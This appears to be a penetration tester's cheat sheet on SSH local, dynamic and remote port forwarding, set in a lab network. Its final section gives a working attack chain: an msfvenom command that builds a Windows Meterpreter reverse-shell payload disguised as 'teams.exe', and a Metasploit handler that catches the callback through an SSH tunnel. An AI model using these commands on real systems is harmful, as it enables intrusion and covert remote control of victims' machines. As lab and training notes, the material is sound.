Port forwarding through SSH can be done in two different ways. Local port forwarding or Dynamic port forwarding.

## Local Port Forwarding

In local port forwarding you are telling your machine to open a specific port and send SSH data through it to the other machine that it is connected to on its specified port.
    This is helpful when you are trying to access a single service that you know is on the target host

To set this up you will run the following

```bash
ssh -L 4444:localhost:8080 target@10.10.10.10
```

This will open port 4444 on our localhost and then send traffic through that port to and from port 8080 on the target machine at IP 10.10.10.10

## Dynamic Port Forwarding

In dynamic port forwarding you are opening a port on your local machine and telling it to connect to the target machine over that port with SSH. This will send that traffic to the entire network instead of a specific port on the target. You will then need to use a tool that can route any traffic over the port that you have opened. Something like proxychains.
    This is helpful when you do not have a target service that you are attacking or if you are trying to scan a subnet that the target might be connected to

To set this up you will run the following

```bash
ssh -D 4444 target@10.10.10.10
```

This will open port 4444 on our localhost and then send traffic through that port to and from the target host at IP 10.10.10.10

## Port forward Meterpreter Session Through SSH

```bash
ssh -i rootssh -R 172.16.8.120:4445:10.10.14.5:5555 root@10.129.229.147 -vN
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https -f exe -o teams.exe LHOST=172.16.8.120 LPORT=4445
```

```msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 10.10.14.5
set lport 5555
run -j
```